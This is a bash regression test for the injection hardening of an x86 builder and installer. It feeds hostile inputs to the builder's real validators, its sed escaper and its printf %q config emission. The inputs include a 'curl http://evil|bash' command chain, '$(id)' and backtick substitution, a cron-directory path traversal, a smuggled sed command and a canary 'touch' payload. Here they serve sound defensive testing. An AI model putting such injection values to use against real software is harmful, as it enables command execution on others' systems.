#!/usr/bin/env bash
# test-x86-identity-injection.sh — regression test for the shell/template-injection
# hardening of the x86 builder + installer (sweep findings #1,#5,#6,#10,#16,#17).
#
# The x86 builder substitutes operator/multi-tenant identity fields (DEFAULT_USER,
# LOCAL_USER, BRAND, ORG, CLUSTER_DOMAIN, GAMES_DOMAIN, HOSTNAME, BRAND_TITLE,
# BRAND_ACCENT) into:
#   * root-run first-boot scripts (useradd/chpasswd)            — unquoted shell words
#   * `sed s|..|VALUE|` replacements (render_template/rebrand)  — sed-program injection
#   * dot-sourced KEY=VALUE files (brand.conf / home.conf)      — code exec on source
#   * the installer's fstab line (HOME_DEVICE)                  — field/line injection
#
# This proves, by sourcing the REAL helpers extracted from the builder, that:
#   (A) the up-front validators REJECT injection inputs (`;`, `'`, `|`, `&`, newline,
#       spaces, shell-meta) for usernames/brand/org/domains/title/accent, and EXIT;
#   (B) every legitimate default still PASSES (snap / snapdragon / Snapdragon-Systems
#       / snapdragon.systems / "Snapdragon Systems" / #1f6feb);
#   (C) _sed_rep_escape neutralises `|`/`&`/`\` so a tainted-but-validated value cannot
#       smuggle a second sed command;
#   (D) brand.conf / home.conf emitted with `printf %q` cannot execute injected code
#       when dot-sourced as root;
#   (E) the installer's quoted fstab write keeps HOME_DEVICE a single field.
#
# Rootless; needs bash + sed.
set -uo pipefail

REPO="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
BUILDER="${REPO}/build-x86-host-stage4.sh"
INSTALLER="${REPO}/specs-x86/installer/install-x86.sh"
[ -f "${BUILDER}" ]   || { echo "  FAIL builder missing: ${BUILDER}"; exit 1; }
[ -f "${INSTALLER}" ] || { echo "  FAIL installer missing: ${INSTALLER}"; exit 1; }

P=0; F=0
ok(){ echo "  PASS $*"; P=$((P+1)); }
bad(){ echo "  FAIL $*"; F=$((F+1)); }
WORK="$(mktemp -d)"; trap 'rm -rf "${WORK}"' EXIT

echo "== x86 identity/branding injection hardening unit test =="

# ── Extract the REAL helpers from the builder (so this test tracks the code) ──────
extract_fn() { awk "/^$1\(\) \{/{p=1} p{print} /^\}/{if(p){exit}}" "${BUILDER}"; }
# Minimal stubs so the extracted validators run standalone (they call err()).
err(){ echo "ERROR: $1" >&2; }
for fn in _validate_username _validate_slug _validate_org _validate_dnsname \
          _validate_hostname _validate_title _sed_rep_escape; do
  eval "$(extract_fn "${fn}")"
  type "${fn}" >/dev/null 2>&1 || { echo "  FAIL could not extract ${fn} (renamed/removed?)"; exit 1; }
done
ok "extracted the real builder validators + _sed_rep_escape"

# A validator REJECTS when it exits non-zero (it calls `exit 1` on bad input).
rejects(){ ( "$@" ) >/dev/null 2>&1; [ $? -ne 0 ]; }
accepts(){ ( "$@" ) >/dev/null 2>&1; }

# ── (A) injection inputs are REJECTED ────────────────────────────────────────────
# username (#1/#16): `;`-chain, `'`-breakout, newline, space, shell-meta
for bad_user in 'x; curl http://evil|bash #' "x'y" $'x\ny' 'a b' 'X' '-leadinghyphen' '1startsdigit' 'foo$(id)' 'a|b'; do
  if rejects _validate_username "DEFAULT_USER" "${bad_user}"; then ok "username rejected: $(printf %q "${bad_user}")"
  else bad "username NOT rejected: $(printf %q "${bad_user}")"; fi
done
# brand slug (#6/#17): traversal, sed-meta, uppercase, space
for bad_brand in '../../../etc/cron.d' 'a|d s/.*/x/' 'Snap' 'a b' 'x&y' $'a\nb' 'foo/bar'; do
  if rejects _validate_slug "--brand" "${bad_brand}"; then ok "brand rejected: $(printf %q "${bad_brand}")"
  else bad "brand NOT rejected: $(printf %q "${bad_brand}")"; fi
done
# org (#6): slash, space, quote, sed-meta
for bad_org in 'a/b' 'a b' 'x"y' 'a|d' 'x&y' $'a\nb' 'foo$(id)'; do
  if rejects _validate_org "--org" "${bad_org}"; then ok "org rejected: $(printf %q "${bad_org}")"
  else bad "org NOT rejected: $(printf %q "${bad_org}")"; fi
done
# domain (#6): sed-meta, space, scheme, uppercase
for bad_dom in 'a|d.test' 'x&y.test' 'a b.test' 'http://x' $'a\nb' 'X.test'; do
  if rejects _validate_dnsname "--cluster-domain" "${bad_dom}"; then ok "domain rejected: $(printf %q "${bad_dom}")"
  else bad "domain NOT rejected: $(printf %q "${bad_dom}")"; fi
done
# title (#5/#6): quote/backslash/$/backtick/pipe/ampersand/newline
for bad_title in 'foo"; touch /tmp/x; #' 'a$(id)b' 'a`id`b' 'a|b' 'a&b' $'a\nb' 'a\\b'; do
  if rejects _validate_title "--brand-title" "${bad_title}"; then ok "title rejected: $(printf %q "${bad_title}")"
  else bad "title NOT rejected: $(printf %q "${bad_title}")"; fi
done

# ── (B) legitimate defaults still PASS ───────────────────────────────────────────
accepts _validate_username "DEFAULT_USER" "snap"            && ok "username 'snap' accepted"               || bad "username 'snap' rejected"
accepts _validate_username "DEFAULT_USER" ""                && ok "empty username (use-default) accepted"   || bad "empty username rejected"
accepts _validate_username "LOCAL_USER"   "media_user-1"    && ok "username 'media_user-1' accepted"        || bad "username 'media_user-1' rejected"
accepts _validate_slug     "--brand"      "snapdragon"      && ok "brand 'snapdragon' accepted"             || bad "brand 'snapdragon' rejected"
accepts _validate_org      "--org"        "Snapdragon-Systems" && ok "org 'Snapdragon-Systems' accepted"    || bad "org 'Snapdragon-Systems' rejected"
accepts _validate_dnsname  "--cluster-domain" "snapdragon.systems" && ok "domain 'snapdragon.systems' accepted" || bad "domain rejected"
accepts _validate_dnsname  "--games-domain"   "games.snapdragon.systems" && ok "games domain accepted"      || bad "games domain rejected"
accepts _validate_hostname "--hostname"   ""                && ok "empty hostname (role-derived) accepted"  || bad "empty hostname rejected"
accepts _validate_hostname "--hostname"   "snap-omnibus"    && ok "hostname 'snap-omnibus' accepted"        || bad "hostname rejected"
accepts _validate_title    "--brand-title" "Snapdragon Systems" && ok "title 'Snapdragon Systems' accepted" || bad "title rejected"

# ── (C) _sed_rep_escape neutralises sed metacharacters ───────────────────────────
# Without escaping, a value with `|` would terminate `s|..|VALUE|` and inject a 2nd
# command. With escaping the literal text lands verbatim and no extra command runs.
# Payload tries to inject a SECOND command `s/keepme/REPLACED/`. If escaping fails the
# trailing literal "keepme" gets rewritten to "REPLACED"; if it works "keepme" survives
# (the metacharacters were inserted as data). Assert the literal landed AND keepme stayed.
esc="$(_sed_rep_escape 'a|g;s/keepme/REPLACED/')"
out="$(printf 'TOKEN keepme\n' | sed "s|TOKEN|${esc}|g")"
if [ "${out}" = 'a|g;s/keepme/REPLACED/ keepme' ]; then
  ok "_sed_rep_escape neutralised the | sed-command injection (keepme survived)"
else bad "_sed_rep_escape did NOT neutralise sed injection (got: ${out})"; fi
# `&` (whole-match backref) must be escaped to a literal &.
out2="$(printf 'X\n' | sed "s|X|$(_sed_rep_escape 'a&b')|g")"
[ "${out2}" = 'a&b' ] && ok "_sed_rep_escape neutralised & backref" || bad "& not escaped (got: ${out2})"

# ── (D) brand.conf / home.conf %q emission cannot execute on source ──────────────
# Emit exactly as the builder does (printf %q) with an injection payload, then source.
canary="${WORK}/canary"; rm -f "${canary}"
BRAND='x'; BRAND_TITLE='foo"; touch '"${canary}"'; #'; BRAND_ACCENT='#000000'
{
  printf 'BRAND_NAME=%q\n'  "${BRAND}"
  printf 'BRAND_TITLE=%q\n' "${BRAND_TITLE}"
  printf 'ACCENT_COLOR=%q\n' "${BRAND_ACCENT}"
} > "${WORK}/brand.conf"
( set +e; . "${WORK}/brand.conf" >/dev/null 2>&1
  if [ -e "${canary}" ]; then exit 1; fi
  # value must survive intact for the applier (it round-trips through %q)
  [ "${BRAND_TITLE}" = 'foo"; touch '"${canary}"'; #' ] || exit 2
)
rc=$?
[ ! -e "${canary}" ] && [ "${rc}" -eq 0 ] && ok "brand.conf %q: injection NOT executed on source + value intact" \
  || bad "brand.conf %q failed (canary=$( [ -e "${canary}" ] && echo HIT || echo ok ) rc=${rc})"

canary2="${WORK}/canary2"; rm -f "${canary2}"
HOME_MODE='adopt'; HOME_DEVICE='LABEL=h"; touch '"${canary2}"'; HOME_DEVICE="'; HOME_BACKUP=''
HOME_ENCRYPTED='false'; HOME_SEED_CODE='none'; LOCAL_USER='snap'
{
  printf 'HOME_MODE=%q\n'      "${HOME_MODE}"
  printf 'HOME_DEVICE=%q\n'    "${HOME_DEVICE}"
  printf 'HOME_BACKUP=%q\n'    "${HOME_BACKUP}"
  printf 'HOME_ENCRYPTED=%q\n' "${HOME_ENCRYPTED}"
  printf 'HOME_SEED_CODE=%q\n' "${HOME_SEED_CODE}"
  printf 'LOCAL_USER=%q\n'     "${LOCAL_USER}"
} > "${WORK}/home.conf"
( set +e; . "${WORK}/home.conf" >/dev/null 2>&1; [ -e "${canary2}" ] && exit 1 || exit 0 )
[ ! -e "${canary2}" ] && ok "home.conf %q: injection NOT executed on source" \
  || bad "home.conf %q executed injected command on source"

# ── (E) installer fstab write keeps HOME_DEVICE a SINGLE field (quoted) ───────────
# The builder emits HOME_DEVICE via %q; the installer writes it quoted. Even a value
# with embedded spaces must produce ONE fstab line whose field-1 is the whole value.
fstab="${WORK}/fstab"; : > "${fstab}"
HM_DEVICE='LABEL=h x'   # benign device label with a space (post-%q this is one token)
printf '%s  /home  auto  nofail,noatime,nosuid,nodev  0 2\n' "${HM_DEVICE}" >> "${fstab}"
lines="$(wc -l < "${fstab}")"
field1="$(awk '{print $1" "$2}' "${fstab}")"   # field-1 may contain the space → re-read raw
raw="$(cat "${fstab}")"
if [ "${lines}" -eq 1 ] && printf '%s' "${raw}" | grep -qF 'LABEL=h x  /home  auto'; then
  ok "installer fstab: HOME_DEVICE stays one quoted field (no extra line/field injection)"
else bad "installer fstab field/line injection (lines=${lines} raw=${raw})"; fi

# Assert the installer source actually quotes the device (no bare \${HM_DEVICE} word).
if grep -Eq 'echo "\$\{HM_DEVICE\}  /home' "${INSTALLER}"; then
  bad "installer still writes the UNQUOTED \${HM_DEVICE} fstab field"
else ok "installer no longer emits an unquoted \${HM_DEVICE} fstab word"; fi

# Assert the builder emits brand.conf/home.conf via printf %q (not naive KEY=\"\$V\").
if grep -q "printf 'BRAND_TITLE=%q" "${BUILDER}" && grep -q "printf 'HOME_DEVICE=%q" "${BUILDER}"; then
  ok "builder emits brand.conf + home.conf via printf %q"
else bad "builder no longer uses printf %q for brand.conf/home.conf"; fi

echo "== done: ${P} passed, ${F} failed =="
[ "${F}" -eq 0 ]
